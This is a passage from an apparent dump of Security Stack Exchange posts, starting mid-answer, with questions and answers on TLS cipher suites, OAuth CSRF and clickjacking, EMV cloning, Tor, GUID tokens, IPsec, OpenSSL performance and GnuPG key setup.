<p>It has the added bonus of increasing the ease of verification of trust, such as situations where you've got clients that trust CA1 or CA2 (but not both). In such a case, you can cross-sign a cert to be trusted by both. This allows more clients to verify trust without having to distribute separate certs for different CAs.</p>

<p>Another bonus is in situations where a CA's private key is leaked. Let's say CA1's key leaks and your cert is signed by CA1 and CA2. In the wake of the leak, CA1 issues a revokation for its public key and you can no longer trust anything issued by CA1. However, since your cert is cross-signed to CA2 as well, any client that trusts CA2 can still maintain a level of trust in your cert.</p>
","14050"
"How secure is the new Mega-site encryption?","17145","","<p>The new <a href=""https://mega.co.nz/"">Mega</a> site, sucessor of Megaupload, claims that all information is encrypted with a symetric key that only the user has access.</p>

<p>The general terms are listed <a href=""https://mega.co.nz/#privacycompany"">here</a>: </p>

<blockquote>
  <p>All files stored on MEGA are encrypted. All data transfers from and to MEGA are encrypted. And while most cloud storage providers can and do claim the same, MEGA is different – unlike the industry norm where the cloud storage provider holds the decryption key, with MEGA, you control the encryption, you hold the keys, and you decide who you grant or deny access to your files, without requiring any risky software installs. It’s all happening in your web browser!</p>
</blockquote>

<p>In the <a href=""https://mega.co.nz/#developers"">developers page</a> there are some details about AES 128bits, 64 random bits as some initial value, and so on, but I can't find details on how the end-user will have that protection.</p>

<p>Does someone how their encryption / security really works? Is it really secure?</p>
","<p>The details are relatively scarce, but section 5 of ht <a href=""https://mega.co.nz/#developers"">developers' page</a> you link to describes the kind of encryption they apply. Bottom-line: they don't say it explicitly, but it is basically <a href=""http://en.wikipedia.org/wiki/CCM_mode"">CCM mode</a>, albeit with some simplifications in IV management. They don't talk about padding and length encoding, and this might be an issue.</p>

<p>Also, the file is split into chunks, each chunk having its own MAC, so that you may ""process"" chunks individually. However, it seems that there is no sequence number in the MAC thing; as far as the text says, the IV for the MAC of the second chunk is the CBC-MAC of the first chunk, which is bad because it could be altered by a malicious individual. In practice, this means that the per-chunk MAC is useful only if you stream the data <em>from the beginning</em>, in due order; random access would be susceptible to attacks.</p>

<p>The main concept of using a per-file key is sound, but it requires some careful handling of the keys and there is not enough detail on the page to decide whether things were done properly or not. The whole thing reeks of a homemade construction and it is known that homemade constructions are fertile ground for vulnerabilities.</p>
","29438"
"Client-server encryption technique explanation (TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, 128 bit keys)","17135","","<p>I opened a web page using https.</p>

<p>When I looked at the page info provided by my browser (Firefox) I saw following:</p>

<blockquote>
  <p>Connection encrypted: High-grade Encryption
  (TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, 128 bit keys).</p>
</blockquote>

<p>I got a question - what does this encryption technique means?
In attempt to understand it I decided to find data on each part of it:</p>

<p><strong>TLS_ECDHE</strong> means <em>ephemeral Elliptic Curve Diffie-Hellman</em> and as <a href=""http://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellman"">Wikipedia says</a> it allows two parties to establish a shared secret over an insecure channel.</p>

<p><strong>RSA</strong> is used to prove the identity of the server as described in <a href=""http://arstechnica.com/security/2013/10/a-relatively-easy-to-understand-primer-on-elliptic-curve-cryptography/3/"">this article</a>.</p>

<p>WITH_<strong>AES_128_GCM_SHA256</strong>:
If I understand correctly - AES_128_GCM is a technique which provides authenticated encryption as described on <a href=""http://www.cryptopp.com/wiki/GCM_Mode"">this page</a>.</p>

<p><strong>SHA256</strong> is a hashing algorithm - one way function.</p>

<p>But now I am trying to understand how to put all these things together.
How does it work together as a whole and why it was setup in this way?</p>

<p>In this <a href=""http://youtu.be/YEBfamv-_do"">YouTube video</a> Alice and Bob use Diffie-Helman keys exchange algorithm to agree on a secret key which they are going to use (this is TLS_ECDHE in our case). Isn't it enough to establish a secure connection (besides of RSA part which Alice and Bob did not do)? Why also there is this part <strong>WITH_AES_128_GCM_SHA256</strong> exists?</p>
","<h2>Asymmetric Cryptography</h2>

<p>There are two different parts to creating a TLS session.  There is the <a href=""http://en.wikipedia.org/wiki/Asymmetric_cryptography"" rel=""noreferrer"">asymmetric cryptography</a>, portion which is an exchange of public keys between two points.  Which is what you saw in your Alice and Bob example.  This only allows the exchange of asymmetric keys for asymmetric encryption/decryption.  This is the <strong>ECDHE</strong> portion.  The <strong>RSA</strong> portion describes the <a href=""http://en.wikipedia.org/wiki/Digital_signature#Authentication"" rel=""noreferrer"">signing algorithm</a> used to authenticate the key exchange.  This is also performed with asymmetric cryptography.  The idea is that you sign the data with your private key, and then the other party can verify with your public key.  </p>

<h2>Symmetric Cryptography</h2>

<p>You encrypt symmetric encryption/decryption keys with your asymmetric key.  Asymmetric encryption is very slow (relatively speaking).  You don't want to have to encrypt with it constantly.  This is what <a href=""http://en.wikipedia.org/wiki/Symmetric_cryptography"" rel=""noreferrer"">Symmetric Cryptography</a> is for.  So now we're at <strong>AES_128_GCM</strong>.  </p>

<ul>
<li>AES is the symmetric algorithm</li>
<li>128 refers to key size in bits</li>
<li>GCM is the <a href=""http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation"" rel=""noreferrer"">mode of operation</a> </li>
</ul>

<p>So what exactly does our asymmetric key encrypt?  Well we want to essentially encrypt the symmetric key (in this case 128 bits, 16 bytes).  If anyone knew the symmetric key then they could decrypt all of our data.  For TLS the symmetric key isn't sent directly.  Something called the pre-master secret is encrypted and sent across.  From this value the client and server can generate all the keys and IVs needed for encryption and data integrity.  <a href=""http://en.wikipedia.org/wiki/Transport_Layer_Security#Basic_TLS_handshake"" rel=""noreferrer"">Detailed look at the TLS Key Exchange</a></p>

<h2>Data Integrity</h2>

<p><a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""noreferrer"">Data integrity</a> is needed throughout this process, as well as with the encrypted channel.  As you saw when looking up GCM, the encryption mode of operation itself provides for the integrity of the data being encrypted.  However, the public key handshake itself must also be confirmed.  If someone in the middle changed data while being transmitted then how could we know nothing was tampered with?  This is what instance where the negotiated hash function is used, <strong>SHA256</strong>.  Every piece of the handshake is hashed together, and the final hash is transmitted along with the encrypted pre-master secret.  The other side verifies this hash to ensure all data that was meant to be sent was received.</p>

<p><strong>SHA256</strong>, as mentioned by another poster, is also used for the Pseudo-Random Function (PRF).  This is what expands the pre-master secret sent between the two parties into the session keys we need for encryption.</p>

<p>For other modes of operation, each message would be hashed with this integrity algorithm as well.  When the data is decrypted the hash is verified before using the plaintext.    </p>

<p><a href=""https://security.stackexchange.com/a/39596/52676"">Here is a great explanation for how these derivations happen for different TLS versions.</a>  </p>

<p>Put all these pieces together and you have yourself a secure mode of communication!</p>

<hr>

<p>You can list all possible ciphers that OpenSSL supports with <code>openssl ciphers</code>.  You can go further and print the details of any of these cipher suites with the <code>-V</code></p>

<p>For example:</p>

<pre><code>$ openssl ciphers -V ECDHE-RSA-AES256-GCM-SHA384
          0xC0,0x30 - ECDHE-RSA-AES256-GCM-SHA384 TLSv1.2 Kx=ECDH     Au=RSA  Enc=AESGCM(256) Mac=AEAD
</code></pre>

<ul>
<li><code>0xC0,0x30</code> represents the two byte identifier for the cipher suite</li>
<li><code>Kx=ECDH</code> represents the key exchange algorithm</li>
<li><code>Au=RSA</code> represents the authentication algorithm</li>
<li><code>Enc=AESGCM(256)</code> represents the symmetric encryption algorithm</li>
<li><code>Mac=AEAD</code> represents the message authentication check algorithm used</li>
</ul>
","65645"
"Recover the prior contents of RAM from a turned-off PC?","17125","","<p>I've heard that if your PC is turned off, then an attacker can recover the RAM from the last session. I find this hard to believe. How could it be done?</p>
","<p>There is an element of truth to this one - an attack was discovered which took advantage of data remanence in RAM, allowing an attacker to grab data from the RAM in a machine. There was a very short timeframe (a matter of seconds or minutes) in which to do this, but it wasn't a hack of the PC as such.</p>

<p>Simple Wikipedia link to <a href=""http://en.wikipedia.org/wiki/Cold_boot_attack"">Cold Boot Attack here</a></p>

<p>And the <a href=""http://mcgrewsecurity.com/oldsite/tools/msramdmp/"">McGrew link here</a> giving more detail</p>
","10644"
"Bank account number and account holder in check exposed?","17113","","<p>I'm not sure if this is standard practice in all banking institutions but almost all banks where I've received checks the account number of the issuer is exposed (some even the account name). Isn't this information considered confidential? If not then disregard this question.</p>

<p>If yes, then it makes me wonder why banks blatantly expose the account number/name of the issuer in checks? Would it be a good practice if they at least hash the account name and number before they print it in the checks you will issue?</p>
","<p>Going to have another go at this one, to try and address the many excellent comments...</p>

<p>A cheque is an instruction to a bank to take money from Alice's account and give it to Bob. In order to act on it, the bank need to know Alice's account details; they must be written on the cheque in some form when it arrives for clearing.</p>

<p>A pre-printed cheque in Alice's cheque book happens to have her account number already written on it, purely for convenience sake, in both human and machine readable forms. </p>

<p>@IMB first asks if this is a vulnerability, since if Eve gets hold of a cheque, she can read the account details off it and use them in an attack. The answer is yes, it is a vulnerability.</p>

<p>Then @IMB asks if hashing the account details would be a good control. I suspect they actually mean encrypting, rather than hashing, as cryptographic hashing is a rather specific technical term that doesn't quite apply here, but you get the picture. The answer is also yes, if done carefully, encrypting the account number (with a suitable nonce added) would largely prevent Eve using the account information.</p>

<p>Lastly @IMB asks why don't the banks do it then? Well, as with every security control, <em>you have to measure the cost of using it against the impact of a failure</em> in order to decide if you should implement it or not.</p>

<p>I think the main cost is that humans could no longer read the whole cheque. That doesn't sound like a problem in these days of ubiquitous computing, but banks are conservative and old fashioned and they are particularly fond of having human audit processes. They like a manager being able to pull a cheque at random every day and double-check how it was processed. They like being able to pull a physical piece of paper out and wave it at a customer and say ""No, we didn't make a mistake.""</p>

<p>Additional costs are that it adds overhead to the cheque clearing process (and customers already hate how long that takes), that you no longer have a backup if the machine readable part of a cheque is damaged, and I suppose you might run into regulatory difficulties about the legal definition of a cheque.</p>

<p>The risks, on the other hand, are not huge, because the banks have other controls in place. They authenticate people before allowing them to remove money, and require more than just account numbers to easily withdraw money. They use various technical methods to prevent Eve printing cheques with Alice's details on. They have insurance to cover any losses. They  monitor account activity for suspicious transactions. </p>

<p>One last thing to consider: Alice has to tell her account details to quite a lot of people anyway: her employer (so she gets paid), the tax man, the water company (for direct debits) and so on. And she has to embed it in her debit card. And the bank have to print it on her statements... So Eve has many other ways to get this information.</p>

<p>In the end, the banks have weighed the costs and the risks and concluded it's just not worth it - especially considering the decline in use of cheques. Last time I tried to pay for something in a store by cheque they had to get the manager because none of the sales assistants had seen one before except in movies.</p>
","14119"
"Why EMV cards cannot be cloned?","17076","","<p>It's frequently stated that EMV cards cannot be cloned. I'd like to know, specially with commodity smart card readers/ writers, why is this true? What specific data cannot be read using commodity hardware, and what type of hardware would be required to do so?</p>
","<p>To use an analogy, expanding on what people have said about it being a chip:</p>

<p>An older style magstripe card was simply a string of characters encoded onto the card, it could be read, or written, and that was it.  It's like a page of a book, you can read it, but if you don't understand, you can't ask it questions.</p>

<p>An EMV chip is a small microprocessor. It runs a specific application. You can't just read what it knows, but you can 'ask' it 'questions' by <a href=""http://en.wikipedia.org/wiki/EMV#EMV_commands"">issuing commands</a> from the EMV set, and see what it returns.  Unlike Magstripe, it's interactive, and is capable of both answering and more importantly, <em>refusing to answer</em> queries.</p>

<p>All of this is a little simplified.  Encryption obviously plays a large role in EMV, and it's much complex than just some little microbug that you can interview, like I make it sound, but the essence is there.</p>

<p>Like @Lucas Kauffman has mentioned, EMV isn't unclonable, but it is significantly more difficult, at least if you start from first principles.  As with many security issues, these complex differences will start to mean less and less now that vulnerabilities have been found, because it will be possible to buy cloners without needing to know how they actually work.</p>
","46325"
"How to detect if employees are using Tor?","17061","","<p>We work in an organisation which is supposed to be HIPAA compliant. Security is a big concern for us. We've been tasked to find out if any user is using anonymous proxy in the network.</p>

<p>Is there a way we can find if <a href=""https://www.torproject.org/"">Tor</a> is being used inside our corporate network domain? We're using Symantec client protection. VPN is provided using Cisco.</p>
","<p>You can use a <a href=""https://www.dan.me.uk/torlist/"">list</a> of Tor (uplink) nodes, add this to the outgoing firewall, setup a task to update this once a day and you'll be good. But Tor can also be used over a HTTP(S) proxy, so you will have to detect proxies as well.</p>

<p>I am not sure if this is going to help you secure anything. As long as there is a connection to the internet, it would be possible to bypass these kind of security measures. You could end up spending endless time and energy to prohibit all kinds of proxies, VPN's, SSL tunnels and such. The advice is to just make sure they cannot do any harm by protecting whats important to your business, and leave users be. For example separate the network in compartments, use subnets, VLANs, DMZs and require authentication and authorization on private networks. Keep the important stuff in one zone, while allowing networking without restrictions on another. And so on...</p>
","135909"
"How does a website know if a certain creditcard number is wrong instantly","17051","","<p>I was renewing my Internet subscription through the online portal of my ISP.
What struck me was when I was entering my credit card details, I entered the type of my credit card (MasterCard, Visa, AA, etc), and when I entered the numbers, there was one number that I entered wrong. When I pressed the submit button, the website automatically gave me an error that the card number I entered was invalid. I sense this was done locally in the browser and no data was pushed and checked on a server and sent back a reply.</p>

<p>My question is, is there any sequence of numbers each vendor has? Otherwise, how would the website (locally) know about the wrong number ? </p>
","<h2>Checksums</h2>

<p>CC numbers, as well as pretty much any other well designed important numbers (e.g. account numbers in banks) tend to include a checksum to verify integrity of the number. While not a security feature (since it's trivial to calculate), a decent checksum algorithm can guarantee to always fail if (a) a single typo was made or (b) two neighbouring digits are swapped, which are the two most common errors when manually entering long numbers.</p>

<p><a href=""http://rosettacode.org/wiki/Luhn_test_of_credit_card_numbers"">http://rosettacode.org/wiki/Luhn_test_of_credit_card_numbers</a> is an example of such a test.</p>

<h2>Issuer</h2>

<p>If a CC number is <em>technically</em> correct, it may still be not a real CC number. The method for verifying that is simple and complicated at the same time - generally, if you have appropriate access you are able to the look up the issuer institution for each range of card numbers, and then you ask the issuer[s card systems] if they think that this is a valid card. Well, the second part generally happens as a part of making a CC payment, but verifying the issuer is sometimes done before that as an extended test; but not on the client browser.</p>
","81795"
"Are GUIDs safe for one-time tokens?","17021","","<p>I see a lot of sites use GUIDs for password resets, unsubscribe requests and other forms of unique identification.</p>

<p>Presumably they are appealing because they are easy to generate, unique, non-sequential and seem random. </p>

<p><strong>But are they safe enough for these purposes?</strong></p>

<p>It seems to me that given a GUID, predicting subsequent GUIDs may be possible since (as far as I know) they're not intended to be cryptographically secure...or are they?</p>

<p>Note: </p>

<ul>
<li>I'm <em>not</em> talking about sites that use a random blob of gobbledygook encoded in base64. </li>
<li>I'm talking about sites like this that appear to be using a raw guid:<br>
<code>http://example.com/forgotPassword/?id=b4684ce3-ca5b-477f-8f4d-e05884a83d3c</code></li>
</ul>
","<p>Are they safe enough for the purposes you described?  In my opinion, generally yes.   Are they safe enough in applications where security is a significant concern?  No.   They're generated using a non-random algorithm, so they are not in any way cryptographically random or secure.  </p>

<p>So for an unsubscribe or subscription verification function, I really don't see a security issue.  To identify a user of an online banking application on the other hand, (or really probably even a password reset function of a site where identity is valuable) GUIDs are definitely inadequate.  </p>

<p>For more information, you might want to check out <a href=""http://tools.ietf.org/html/rfc4122#section-6"">section 6 (Security Considerations)</a> of the RFC 4122 for GUIDs (or Universally Unique Identifiers).</p>
","891"
"OAuth2 Cross Site Request Forgery, and state parameter","16971","","<p><a href=""http://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-10.12"" rel=""nofollow noreferrer"">http://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-10.12</a> says:</p>

<blockquote>
  <p>The client MUST implement CSRF protection [...] typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state (e.g. a hash of the session cookie [...]</p>
</blockquote>

<p>It doesn't say much about the implementation, though. It only puts some light on how the CSRF works:</p>

<blockquote>
  <p>A CSRF attack against the client's redirection URI allows an attacker to inject their own authorization code or access token, which can result in the client using an access token associated with the attacker's protected resources rather than the victim's (e.g. save the victim's bank account information to a protected resource controlled by the attacker)</p>
</blockquote>

<p>But use of the word ""rather"" rather makes the statement worthless.</p>

<p>I am thinking how to implement the ""state"" in GAE (using Webapp2). It would be easiest starting at how a hacker could use a CSRF against OAuth2. I found only one good article about the matter: <a href=""https://spring.io/blog/2011/11/30/cross-site-request-forgery-and-oauth2"" rel=""nofollow noreferrer"">""Cross Site Request Forgery and OAuth2""</a>.</p>

<p>Unfortunately, while this blog post is well written, there's not much information beyond explaining the OAuth2. The examples don't work, and I don't know Spring. Still, I found one interesting recommendation there: <strong>the server connecting to an OAuth2 provider should store ""state"" as a random session key</strong> (e.g. ""this_is_the_random_state"":""this_doesn't_matter"")<strong>, and not a value under a static key</strong> (e.g. ""state"":""random_state_string"").</p>

<hr>

<p>My question is, what's the sane implementation of the ""state""?</p>

<ul>
<li>Should the randomly generated state be hashed, or can the same value be stored and sent to the OAuth2 provider?</li>
<li>Is there a difference here if the session backend is secure cookies or a server-side storage technology (e.g. in GAE Memcache, or  database)?</li>
<li>Should state be stored as a key as suggested?</li>
<li>Should state has validity period, or is session (if there is one) lifetime enough?</li>
</ul>
","<p>I will simplify this problem.  <a href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"" rel=""nofollow noreferrer"">Cross-Site Request Forgery</a> and <a href=""https://www.owasp.org/index.php/Clickjacking"" rel=""nofollow noreferrer"">Clikjacking</a> attacks are useful because it can force a victim's browser into performing actions against their will.</p>

<p>The mention of <code>10.12. Cross-Site Request Forgery</code> and <code>10.13. Clickjacking</code> in the <a href=""http://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-10.12"" rel=""nofollow noreferrer"">OAuth v2 RFC</a> have fundamentally the same concern.  If an attacker can force a victim's browser into authenticating,  then it is a useful step in forcing the victim's browser into performing other actions.</p>

<pre><code>   in a clickjacking attack, an attacker registers a legitimate client
   and then constructs a malicious site in which it loads the
   authorization server's authorization endpoint web page in a
   transparent iframe overlaid on top of a set of dummy buttons, which
   are carefully constructed to be placed directly under important
   buttons on the authorization page.  When an end-user clicks a
   misleading visible button, the end-user is actually clicking an
   invisible button on the authorization page (such as an ""Authorize""
   button).  This allows an attacker to trick a resource owner into
   granting its client access without their knowledge.
</code></pre>

<p>Source: <a href=""http://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-10.13"" rel=""nofollow noreferrer"">10.13. Clickjacking</a></p>

<p>For example, Stack Overflow uses OAuth and is vulnerable to this attack. If you visit StackOverflow and you are currently logged into your OAuth provider, you will be automatically logged in to StackOverflow.   Therefor an attacker could automatically log in a victim by loading Stack Oveflow within an iframe. If Stack Overflow also had a CSRF vulnerability (<a href=""http://www.codinghorror.com/blog/2008/09/cross-site-request-forgeries-and-you.html"" rel=""nofollow noreferrer"">and it has had them!</a>), then an attacker could automatically authenticate a victim's browser and carry out a CSRF (Session Riding), Clickjacking, or XSS attack against <em>stackoverflow.com</em> in a <strong>Chained Attack</strong>.</p>
","20878"
"Why Use IPSEC AH vs ESP?","16969","","<p>I am refreshing my understanding of IPSEC.</p>

<p>IPSec is an IETF defined set of security services that use open standards to provide data confidentiality, integrity, and authentication between peers.</p>

<p>IPsec involves two security services:</p>

<ul>
<li>Authentication Header (AH): This authenticates the sender and it
discovers any changes in data during transmission; incompatible with
NAT. </li>
<li>Encapsulating Security Payload (ESP): This not only performs<br>
authentication for the sender but also encrypts the data being sent<br>
(confidentiality).</li>
</ul>

<p>Why would anyone ever use AH?  ESP does it plus more.  In other words, why is AH specified?  Also, has anyone ever deployed or used AH-only IPSEC?</p>
","<p>AH can be easily inspected by firewalls. ESP with NULL is similar but (AFAIK) the firewall doesn't know that it's the NULL cipher and has no easy way to tell after a connection has been established. </p>

<p>So if you want authentication only then that's a plus for AH.</p>
","90030"
"Different performance of openssl speed on the same hardware with AES 256 (EVP and non EVP API)","16956","","<p>If I run openssl 1.0.1e like this :</p>

<pre><code>$ ./openssl speed aes-256-cbc (i.e without EVP API)
Doing aes-256 cbc for 3s on 16 size blocks: 14388425 aes-256 cbc's in 3.00s
Doing aes-256 cbc for 3s on 64 size blocks: 3861764 aes-256 cbc's in 2.99s
Doing aes-256 cbc for 3s on 256 size blocks: 976359 aes-256 cbc's in 3.00s
Doing aes-256 cbc for 3s on 1024 size blocks: 246145 aes-256 cbc's in 2.99s
Doing aes-256 cbc for 3s on 8192 size blocks: 30766 aes-256 cbc's in 3.00s
</code></pre>

<p>However, if I run it like this :</p>

<pre><code>$ ./openssl speed -evp AES256
Doing aes-256-cbc for 3s on 16 size blocks: 71299827 aes-256-cbc's in 3.00s
Doing aes-256-cbc for 3s on 64 size blocks: 18742055 aes-256-cbc's in 2.99s
Doing aes-256-cbc for 3s on 256 size blocks: 4771917 aes-256-cbc's in 2.99s
Doing aes-256-cbc for 3s on 1024 size blocks: 1199158 aes-256-cbc's in 3.00s
Doing aes-256-cbc for 3s on 8192 size blocks: 150768 aes-256-cbc's in 2.99s
</code></pre>

<p>From the <a href=""http://www.openssl.org/docs/crypto/evp.html"">OpenSSL documentation</a>, it seems that using EVP for the same cipher or not using EVP should not make any difference. Yes I see it consistently. Can anyone please provide an insight? I have googled a lot but could not find anything. I will look through code but not sure if I can understand that part.</p>
","<p>In OpenSSL source code, the <code>speed aes-256-cbc</code> function calls <code>AES_cbc_encrypt()</code> which itself uses <code>AES_encrypt()</code>, a function from <code>crypto/aes/aes_x86core.c</code>. It is an obvious ""classical"" implementation with tables.</p>

<p>On the other hand, with EVP, you end up in the code in <code>crypto/evp/e_aes.c</code> which dynamically detects whether the current CPU supports the <a href=""http://en.wikipedia.org/wiki/AES_instruction_set"">AES-NI instructions</a>, a feature of recent x86 processors, which allow for vastly improved performance. In OpenSSL code, the <code>AESNI_CAPABLE</code> macro does the job (feeding on some flags which are set when the library is initialized, using <a href=""http://en.wikipedia.org/wiki/CPUID"">CPUID</a>).</p>

<p><strong>Bottom-line:</strong> with EVP, you benefit from the automatic selection of the improved implementation, based on the current CPU model, whereas the non-EVP code directly uses the generic software implementation, which works everywhere, but is slower.</p>
","35042"
"Secure use of psexec or better alternative to it","16952","","<p>I want to remotely start VMWare virtual machines (I own VMWare Workstation) and to this end I need to execute on host something like ""vmrun -T ws H:\VMWare\VM1\VM1.vmx nogui"" with user desktop context, so launching it from ssh (which runs from the service and doesn't have access to desktop) is not an option.</p>

<p>I know that psexec will work, but this tool has inherent security issues, starting with the need to expose administrative share (which is on by default, but good practice is to disable it) and ending with ease of eavesdropping (more on the topic <a href=""http://www.windowsecurity.com/articles/PsExec-Nasty-Things-It-Can-Do.html"" rel=""nofollow noreferrer"">here</a>).</p>

<p>Maybe someone here knows how to harden it, by for instance tunneling part of traffic inbound to port 443 on host (which is used by psexec) with ssh (only part, because I need to be able to use SMB shares)?</p>

<p>Or better yet, how to make sshd run interactively so it will give (I presume) access to the user's desktop? Or maybe there exist some custom client-server software, which would help with service-mode sshd (e.g. implementing the technique described <a href=""https://stackoverflow.com/questions/267838/how-can-a-windows-service-execute-a-gui-application"">here</a>)?</p>

<p>Thank you for your help.</p>

<p>I have asked similar question <a href=""https://superuser.com/questions/413801/how-to-start-vmware-machines-or-any-other-program-remotely-on-windows-by-ssh"">here</a>, on stackoverflow, but for different audience and from different angle.</p>
","<p>I Finally found the solution that suits me the best, because it doesn't rely on Windows authorization.</p>

<p>The point is to <em>not to</em> run sshd as a Windows service, but from user's personal startup (possibly as a hidden window). That's all. The only trick here is that I need to run it as elevated process.</p>

<p>To launch cygwin sshd interactively in Windows 7 one needs to follow these steps. They are mirrored from my post in <a href=""https://superuser.com/questions/413801/how-to-start-vmware-machines-or-any-other-program-remotely-on-windows-by-ssh/414651#414651"">superuser forum</a> for your conveniece. </p>

<p>(I assume, that cygwin is installed to <code>C:\cygwin</code>, and that it contains the <code>openssh</code> package):</p>

<ol>
<li>Set the <code>sshd</code> service in Administrative Tools\services applet to ""Manual launch"" or ""Disabled""</li>
<li>Take ownership of <code>C:\cygwin\var\empty</code> folder</li>
<li>(optional - for debug) Make sure, that when you run <code>/usr/bin/sshd -D</code> under elevated cygwin prompt you get ssh access to your host.</li>
<li>(optional - for debug) Make sure that when you launch <code>C:\cygwin\bin\run -p C:\cygwin\bin /usr/sbin/sshd -D</code> from elevated command prompt you still get the same access as in point 3. Remember to kill the <code>sshd.exe</code> process afterwards using task manager.</li>
<li>Create new task which launches this command under elevated credentials just after you log-in. See <a href=""http://www.vistax64.com/tutorials/132903-task-scheduler-create-task.html"" rel=""nofollow noreferrer"">this forum thread to see how to do this</a></li>
<li>Log-in with ssh from remote host and run the <code>vmrun -T ws start ...</code> command as you would do it locally, and everything works as expected.</li>
</ol>

<p>I hope it helps those of you, who prefer to stick with ssh authorization for performing administrative tasks.</p>

<p>Please note, that for it to work the user need to actually log into the host (I believe it is best to do it interactively (i.e. not through rdp), but I have not tested this theory)
so this solution is best suited for home/small office network, and perhaps it is not suited for a dedicated server, unless you configure it with ""autologon"" (but the autologon has security issues of its own which can easily offset the benefits of disabling $ADMIN share)</p>
","13969"
"If I visit a HTTPS website when using Tor, is my IP exposed?","16912","","<p>HTTPS is an end-to-end encrypted connection. Given this, does the website I am visiting know my original IP? The website is only available over HTTPS (not unencrypted HTTP).</p>
","<p>No, it won't. </p>

<p>The thing is that when you use HTTPs over TOR you:</p>

<ol>
<li>you use the public key of the server to encipher your message (so nobody except the server will be able to read your message). </li>
<li>then you pass the HTTPs message (which, remember, is encrypted with the public key of the server) to a TOR node, </li>
<li>this TOR node to another, and another and... </li>
<li>finally, the last TOR node will send your encrypted HTTPs message to the server (that includes your key for the session); the response is encrypted by the server with this key and you will be the only one to be able to decrypt the response from the server.<a href=""http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange"">1</a></li>
</ol>

<p>So the graph should be as follow:</p>

<pre><code>---&gt; ""Tor message""  
===&gt; ""HTTPs message""
[T]  ""Tor Node""
[S]  ""Server""
[U]  ""User""

[U]--&gt;[T1]--&gt;[T2]--&gt;[T3]--&gt;...[TN]==&gt;[S]  
[S]==&gt;[TN]--&gt;...[T3]--&gt;[T2]--&gt;[T1]--&gt;[U]
</code></pre>

<p>And yet still your communication will be secret.</p>

<p>If you want to learn a bit more about how your connection is secret you can learn about the key exchange in <a href=""http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange"">this page</a>.</p>
","48811"
"Is the save button delay in a Firefox download dialog a security feature? What does it protect?","16907","","<p>When I click to download a file through Firefox, a dialog window appears asking me whether I want to save the file somewhere or open it immediately once downloaded.</p>

<p><a href=""https://i.stack.imgur.com/sNk7f.png""><img src=""https://i.stack.imgur.com/sNk7f.png"" alt=""Screenshot of a Firefox download dialog""></a></p>

<p>The OK button in the dialog window starts disabled, and doesn't enable until the dialog has had focus for around a second. The dialog isn't modal, and if I focus on another window the OK button will disable and again won't re-enable until the window has held focus for a second.</p>

<p>My partner lamented at this design, and asked me why she couldn't just click OK to download immediately - I responded that I've always thought it was a security feature. Now that I think about it however, I'm not certain exactly what behavior it could be preventing. I would have thought that it might prevent some malicious website from downloading a file secretly by forcing the download window to stay open for at least long enough to see whats going on - however it should be possible for a site to download stuff secretly in the background anyway. Regardless I presume most users would have clicked the 'do this automatically from now on' box at some point, and thus be unprotected anyway...</p>

<p>So, is this a security feature? If so what does it protect against?</p>
","<p>Yes, it is a security feature, and the purpose of the delay is to prevent attacks based around tricking the user into entering input to skip past the dialog by popping it up unexpectedly when the user is in the middle of inputting multiple key presses or mouse clicks in quick succession. The two examples that are given in <a href=""http://www.squarefree.com/2004/07/01/race-conditions-in-security-dialogs/"">this blog post</a> explaining the feature are:</p>

<ul>
<li>A CAPTCHA that asks the user to type the word <code>only</code>. When they press <code>n</code>, a save dialog is popped up, and then the user will immediately press <code>l</code> and then <code>y</code>, which is the keyboard shortcut for OK on some browsers, unintentionally confirming the download</li>
<li>A webpage that convinces the user to double-click somewhere on screen, positioned so that when the dialog opens after the first click, their mouse pointer is right over the ""OK"" button, meaning that they immediately confirm it.</li>
</ul>

<p>By disabling the button for several seconds, the input has no effect.</p>

<p><a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=162020"">Mozilla bug report about the issue</a></p>
","118083"
"What is a good general purpose GnuPG key setup?","16902","","<p>Since most key types can be used for multiple purposes, namely certification, authentication, encryption and signatures, one could simply use one key for everything - which is a <em>bad</em> idea, as elaborated e.g. <a href=""https://security.stackexchange.com/a/8563/3272"">by Thomas Pornin</a>. So one should use different key pairs for different purposes, with different backup methods (decryption should remain possible ""forever"", while signature keys can ""simply"" be replaced) and securing. But I haven't managed to find a one-in-all write up of best practice summarizing answers to the following questions:</p>

<ul>
<li>What type of key should be used for which purpose (RSA, DSA, ... how many bits, when should they expire etc)?</li>
<li>Should all keys be (separate?) subkeys of the certification master key or be individual master keys signed by the former one? I found some non-trivial guides on how to remove the secret master key from your day-to-day used subkeys, but is the trouble involved really worth having a shorter chain-of-trust to these keys compared to an entirely separate certification key?</li>
<li>How important is it actually to keep the certification key offline when one uses a) a ""really"" strong passphrase or b) a hardware device like an OpenPGP card?</li>
</ul>
","<h1>About Using Subkeys</h1>

<p>Use one primary key for <em>each identity</em> you need, otherwise, use subkeys.</p>

<p>Examples for using multiple primary keys:</p>

<ul>
<li>You don't want to mix up your private and professional keys</li>
<li>You need some key <em>not</em> connected with your ""real life"" identity, eg. when prosecuted by the authorities</li>
</ul>

<p>Examples for using subkeys:</p>

<ul>
<li>You want to use multiple keys for multiple devices (so you won't have to revoke your computer's key if you lose your mobile)</li>
<li>You want to switch keys regularly (eg., every some years) without losing your reputation in the Web of Trust</li>
</ul>

<p>I recently posted about <a href=""https://security.stackexchange.com/a/29858/19837"">How many OpenPGP keys to make</a> in another answer.</p>

<h1>About Key Sizes</h1>

<p>The <a href=""http://lists.gnupg.org/pipermail/gnupg-announce/2009q3/000291.html"" rel=""noreferrer""><strong>GnuPG developers recommend using 2k RSA keys</strong></a> for both encryption and signing. This will be definitely fine for currently used subkeys.</p>

<p>As your primary key will <em>not be used for anything but keysigning and validating signatures</em> (and revocation of course), it is seen as good practice to have a quite huge key here, while using smaller sizes (huge enough for time you will need them) for subkeys (which will speed up calculations and reduce file sizes).</p>

